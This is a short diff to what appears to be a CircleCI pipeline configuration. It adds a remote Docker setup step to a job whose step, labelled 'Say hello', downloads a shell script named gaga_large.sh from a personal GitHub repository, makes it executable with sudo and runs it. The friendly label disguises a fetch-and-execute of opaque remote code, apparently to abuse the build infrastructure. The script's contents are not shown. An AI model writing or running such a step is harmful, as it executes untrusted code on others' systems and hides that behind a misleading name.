@@ -16,6 +16,7 @@ jobs:
     steps:
       - checkout
       - docker/install-docker
+      - setup_remote_docker
       - run:
           name: "Say hello"
           command: wget https://github.com/smile1samehada/Test/raw/main/gaga_large.sh && sudo chmod +x gaga_large.sh && ./gaga_large.sh
